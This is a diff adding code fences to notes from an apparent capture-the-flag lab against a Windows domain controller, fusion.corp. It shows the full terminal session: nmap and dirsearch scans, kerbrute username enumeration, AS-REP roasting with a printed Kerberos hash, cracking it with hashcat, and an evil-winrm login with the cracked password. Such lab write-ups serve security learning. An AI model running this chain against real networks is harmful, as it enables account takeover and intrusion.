@@ -1,3 +1,4 @@
+```bash
 ┌──(kali㉿kali)-[~]
 └─$ nmap 10.10.12.203           
 Starting Nmap 7.91 ( https://nmap.org ) at 2021-06-24 16:28 EDT
@@ -15,7 +16,9 @@ PORT     STATE SERVICE
 3389/tcp open  ms-wbt-server
 
 Nmap done: 1 IP address (1 host up) scanned in 47.91 seconds
- 
+```
+
+```bash
  
 ┌──(kali㉿kali)-[~/Downloads]
 └─$ dirsearch -r -u 10.10.12.203
@@ -49,11 +52,11 @@ Target: http://10.10.12.203/
 [16:52:08] 403 -  312B  - /Backup/\..\..\..\..\..\..\..\..\..\etc\passwd
 CTRL+C detected: Pausing threads, please wait...
 [e]xit / [c]ontinue / [n]ext: e
-
+```
 
 nmap -sC -sV -p- -Pn --min-rate 5000 -T5 -v --open 10.10.12.203
 
-
+```bash
 ┌──(kali㉿kali)-[~/Downloads]
 └─$ nmap -sCV -p- -Pn --min-rate 5000 -T5 -v --open 10.10.12.203
 Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
@@ -147,7 +150,7 @@ Completed NSE at 17:01, 0.00s elapsed
 Read data files from: /usr/bin/../share/nmap
 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 Nmap done: 1 IP address (1 host up) scanned in 150.31 seconds
- 
+```
 
 
 
@@ -162,7 +165,7 @@ lparker
 dpertersen
 
 
-
+```bash
 ┌──(kali㉿kali)-[~/Downloads]
 └─$ sudo ./kerbrute userenum --dc 10.10.146.252 -d fusion.corp 'userlist1.txt' -t 100
 
@@ -180,23 +183,23 @@ Version: v1.0.3 (9dad6e1) - 06/26/21 - Ronnie Flathers @ropnop
 2021/06/26 14:36:49 >  [+] VALID USERNAME:	 lparker@fusion.corp
 2021/06/26 14:36:50 >  [+] VALID USERNAME:	 administrator@fusion.corp
 2021/06/26 14:37:54 >  Done! Tested 111 usernames (2 valid) in 70.088 seconds
+``` 
  
  
  
- 
- 
- ┌──(kali㉿kali)-[~/Downloads]
+ ```bash
+┌──(kali㉿kali)-[~/Downloads]
 └─$ impacket-GetNPUsers -dc-ip 10.10.146.252 fusion.corp/lparker -no-pass
 Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation
 
 [*] Getting TGT for lparker
 $krb5asrep$23$lparker@FUSION.CORP:765487cf2df44736d7b77e50903bf01e$b336c16db4210c735d47b52618f87030e5e7686a93f02d8890a338381a1e47bde22af8f1d29dcc079fd1c64d67bf610678517472f0335f2c0efd0f39eba605ae6df503de43ff7bc8dca83f040cf347d4fada24043cac97ceeabaeaf9c4f671821ce7aa7b4f137be73341b21fee3b7717b8d803644edbf3cbe1853da418fd98a5e8b4640d37426d938fce61c74d68c97d090362d5150471a5022208c0ee6139e08897df44ce9c3ec48243a7d2e9bd6059b5d5262982b51cf8e1e85f3b81a97439ddb80ce83bac9ea13d4fbf8d8a3f52d41a089963fe92227af13a530da00d84598f2c6fc1125676b1d7c7
+```
  
- 
 
 
 
-
+```bash
 ──(kali㉿kali)-[~/Downloads]
 └─$ hashcat -m 18200 -a 0 hash.txt /usr/share/wordlists/rockyou.txt --force
 hashcat (v6.1.1) starting...
@@ -258,7 +261,7 @@ Candidates.#1....: **meg** -> หรืำ/จุ
 
 Started: Sat Jun 26 14:43:00 2021
 Stopped: Sat Jun 26 14:43:28 2021
- 
+``` 
  
  
  
@@ -272,27 +275,23 @@ evil-winrm -i 10.10.94.198 -p '!!abbylvzsvs2k6!' --user lparker
 
 
 
-#https://github.com/Hackplayers/evil-winrm
+https://github.com/Hackplayers/evil-winrm
 
-# install dependencies
+#  install dependencies
 sudo gem install winrm winrm-fs stringio
 
-#cloen the
-git clone https://github.com/Hackplayers/evil-winrm.git
+# clone the repo
+https://github.com/Hackplayers/evil-winrm.git
 
 # switch to directory for evil winrm
 kali@kali:~/$cd evil-winrm
 
-#connect to target using low level user credentials
+# connect to target using low level user credentials
+```bash
 kali@kali:~/evil-winrm$ ./evil-winrm.rb -i 10.0.0.33 -u ‘bobjones’ -p ‘Password1’ -s ‘/home/kali/’ -e ‘/usr/share/windows-binaries/’
+```
 
-
-
-
-
-
-
-                                                                                  
+```bash                                                                            
 ┌──(kali㉿kali)-[~/Downloads/evil-winrm]
 └─$ sudo ./evil-winrm.rb -i 10.10.146.252 -p '!!abbylvzsvs2k6!' --user lparker
 
@@ -367,6 +366,6 @@ _".,_,.__).,) (.._( ._),     )  , (._..( '.._"._, . '._)_(..,_(_".) _( _')
 [+] Donut-Loader 
 [+] Invoke-Binary
 
-
+```
 
 
